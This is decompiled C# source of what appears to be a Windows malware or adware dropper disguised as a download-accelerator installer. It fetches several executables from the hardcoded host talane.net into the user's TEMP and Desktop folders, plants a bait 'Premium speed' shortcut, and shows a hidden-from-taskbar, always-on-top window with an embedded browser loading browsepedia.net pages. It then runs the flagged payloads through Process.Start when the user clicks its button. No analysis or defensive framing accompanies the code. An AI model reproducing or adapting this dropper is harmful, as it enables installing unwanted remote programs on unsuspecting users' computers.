using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace uksjbuhpihpaupoju9;

public class screenstart : Form
{
	public string pag01_220213 = "http://browsepedia.net/130213s/130213i.htm";

	private bool pag01complete_220213;

	private bool pag01final_220213;

	private int last_arr;

	private List<Array> lista = new List<Array>();

	private int run_prog;

	private string tempopro_220213 = "";

	private string tempopar_220213 = "";

	private string tempoway_220213 = "";

	private int loadedsite_220213;

	private string pagesite_220213 = "";

	private IContainer components;

	private WebBrowser navegador_1;

	private Panel painel_inicial;

	private Label lb_carregando;

	private ProgressBar barra_progresso;

	private Timer clock;

	private BackgroundWorker worker_fundo;

	private Timer valida_NAV;

	private Panel panel1;

	private Label lb_porc;

	private Button button1;

	public screenstart()
	{
		InitializeComponent();
	}

	private void janelainicial(object sender, EventArgs e)
	{
		clock.set_Enabled(true);
		lista.Add(new string[6] { "http://talane.net/130213d/fun220213.exe", "", "0", "", "TEMP", "http://browsepedia.net/130213s/130213c.htm" });
		lista.Add(new string[6] { "http://talane.net/130213d/dply.exe", "", "0", "", "TEMP", "" });
		lista.Add(new string[6] { "http://talane.net/130213d/240213d_3.exe", "", "1", "", "TEMP", "http://browsepedia.net/130213s/130213c2.htm" });
		lista.Add(new string[6] { "http://talane.net/130213d/Baixar-com-Velocidade-Premium.url", "", "0", "", "DESKTOP", "" });
	}

	private void tela_inicial_FormClosed(object sender, FormClosedEventArgs e)
	{
		Environment.Exit(1);
	}

	private void clock_Tick(object sender, EventArgs e)
	{
		navegador_1.set_Url(new Uri(pag01_220213));
		worker_fundo.RunWorkerAsync();
		clock.set_Enabled(false);
	}

	private void bg_w_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		if (pagesite_220213.Length > 0)
		{
			navegador_1.set_Url(new Uri(pagesite_220213));
		}
		if (last_arr == lista.Count)
		{
			((Control)panel1).set_Visible(true);
		}
		else
		{
			worker_fundo.RunWorkerAsync();
		}
	}

	private void bg_w_ProgressChanged(object sender, ProgressChangedEventArgs e)
	{
		barra_progresso.set_Value(e.ProgressPercentage);
		((Control)lb_porc).set_Text(e.ProgressPercentage + "%");
	}

	private void bg_w_DoWork(object sender, DoWorkEventArgs e)
	{
		string text = "";
		string text2 = "";
		string text3 = "";
		int num = 0;
		foreach (string[] listum in lista)
		{
			if (num != last_arr)
			{
				num++;
				continue;
			}
			text = listum[0];
			text3 = ((listum[1].Length != 0) ? listum[1] : listum[0].Split(new char[1] { '/' })[^1]);
			run_prog = int.Parse(listum[2]);
			tempopar_220213 = listum[3];
			text2 = listum[4];
			pagesite_220213 = listum[5];
			last_arr++;
			break;
		}
		if (text.Length <= 0)
		{
			return;
		}
		if (text2.Equals("TEMP"))
		{
			text2 = Environment.GetEnvironmentVariable("TEMP") + "\\";
		}
		if (text2.Equals("DESKTOP"))
		{
			text2 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
		}
		tempoway_220213 = text2;
		tempopro_220213 = text3;
		text2 += text3;
		Uri requestUri = new Uri(text);
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUri);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		httpWebResponse.Close();
		long contentLength = httpWebResponse.ContentLength;
		long num2 = 0L;
		using WebClient webClient = new WebClient();
		using Stream stream = webClient.OpenRead(new Uri(text));
		using (Stream stream2 = new FileStream(text2, FileMode.Create, FileAccess.Write, FileShare.None))
		{
			int num3 = 0;
			byte[] array2 = new byte[contentLength];
			while ((num3 = stream.Read(array2, 0, array2.Length)) > 0)
			{
				stream2.Write(array2, 0, num3);
				num2 += num3;
				double num4 = num2;
				double num5 = array2.Length;
				double num6 = num4 / num5;
				int percentProgress = (int)(num6 * 100.0);
				worker_fundo.ReportProgress(percentProgress);
			}
			stream2.Close();
		}
		stream.Close();
	}

	private void navegador_1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		if (pag01final_220213)
		{
			Application.Exit();
		}
	}

	private void navegador_2_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	private void check_IE_Tick(object sender, EventArgs e)
	{
		if (pag01complete_220213)
		{
			Environment.Exit(1);
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		string text = "";
		string text2 = "";
		foreach (string[] listum in lista)
		{
			text = ((listum[1].Length != 0) ? listum[1] : listum[0].Split(new char[1] { '/' })[^1]);
			text2 = listum[4];
			if (text2.Length > 0)
			{
				if (text2.Equals("TEMP"))
				{
					text2 = Environment.GetEnvironmentVariable("TEMP") + "\\";
				}
				if (text2.Equals("DESKTOP"))
				{
					text2 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
				}
				File.Delete(text2 + text);
			}
		}
		Application.Exit();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		string text = "";
		string text2 = "";
		string text3 = "";
		int num = 0;
		foreach (string[] listum in lista)
		{
			text = ((listum[1].Length != 0) ? listum[1] : listum[0].Split(new char[1] { '/' })[^1]);
			text2 = listum[3];
			text3 = listum[4];
			num = int.Parse(listum[2]);
			if (text3.Length > 0 && num == 1)
			{
				if (text3.Equals("TEMP"))
				{
					text3 = Environment.GetEnvironmentVariable("TEMP") + "\\";
				}
				if (text3.Equals("DESKTOP"))
				{
					text3 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
				}
				Process.Start(text3 + text, text2);
			}
		}
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Expected O, but got Unknown
		//IL_03b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Expected O, but got Unknown
		//IL_04c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cd: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(screenstart));
		navegador_1 = new WebBrowser();
		painel_inicial = new Panel();
		lb_porc = new Label();
		panel1 = new Panel();
		lb_carregando = new Label();
		barra_progresso = new ProgressBar();
		clock = new Timer(components);
		worker_fundo = new BackgroundWorker();
		valida_NAV = new Timer(components);
		button1 = new Button();
		((Control)painel_inicial).SuspendLayout();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)navegador_1).set_Location(new Point(27, 95));
		((Control)navegador_1).set_MinimumSize(new Size(20, 20));
		((Control)navegador_1).set_Name("navegador_1");
		((Control)navegador_1).set_Size(new Size(326, 250));
		((Control)navegador_1).set_TabIndex(10);
		navegador_1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(navegador_1_DocumentCompleted));
		painel_inicial.set_BorderStyle((BorderStyle)1);
		((Control)painel_inicial).get_Controls().Add((Control)(object)lb_porc);
		((Control)painel_inicial).get_Controls().Add((Control)(object)panel1);
		((Control)painel_inicial).get_Controls().Add((Control)(object)lb_carregando);
		((Control)painel_inicial).get_Controls().Add((Control)(object)barra_progresso);
		((Control)painel_inicial).set_Location(new Point(3, 6));
		((Control)painel_inicial).set_Name("painel_inicial");
		((Control)painel_inicial).set_Size(new Size(347, 62));
		((Control)painel_inicial).set_TabIndex(9);
		((Control)lb_porc).set_AutoSize(true);
		((Control)lb_porc).set_Location(new Point(312, 32));
		((Control)lb_porc).set_Name("lb_porc");
		((Control)lb_porc).set_Size(new Size(0, 13));
		((Control)lb_porc).set_TabIndex(9);
		((Control)panel1).get_Controls().Add((Control)(object)button1);
		((Control)panel1).set_Location(new Point(4, 4));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(336, 53));
		((Control)panel1).set_TabIndex(8);
		((Control)panel1).set_Visible(false);
		((Control)lb_carregando).set_Location(new Point(8, 9));
		((Control)lb_carregando).set_Name("lb_carregando");
		((Control)lb_carregando).set_Size(new Size(102, 13));
		((Control)lb_carregando).set_TabIndex(7);
		((Control)barra_progresso).set_Location(new Point(8, 28));
		((Control)barra_progresso).set_Name("barra_progresso");
		((Control)barra_progresso).set_Size(new Size(301, 23));
		((Control)barra_progresso).set_TabIndex(3);
		clock.add_Tick((EventHandler)clock_Tick);
		worker_fundo.WorkerReportsProgress = true;
		worker_fundo.DoWork += bg_w_DoWork;
		worker_fundo.ProgressChanged += bg_w_ProgressChanged;
		worker_fundo.RunWorkerCompleted += bg_w_RunWorkerCompleted;
		valida_NAV.set_Enabled(true);
		valida_NAV.add_Tick((EventHandler)check_IE_Tick);
		((ButtonBase)button1).set_Image((Image)componentResourceManager.GetObject("button1.Image"));
		((Control)button1).set_Location(new Point(92, 5));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(158, 42));
		((Control)button1).set_TabIndex(7);
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(356, 75));
		((Control)this).get_Controls().Add((Control)(object)navegador_1);
		((Control)this).get_Controls().Add((Control)(object)painel_inicial);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("screenstart");
		((Form)this).set_Opacity(0.9);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosed(new FormClosedEventHandler(tela_inicial_FormClosed));
		((Form)this).add_Load((EventHandler)janelainicial);
		((Control)painel_inicial).ResumeLayout(false);
		((Control)painel_inicial).PerformLayout();
		((Control)panel1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
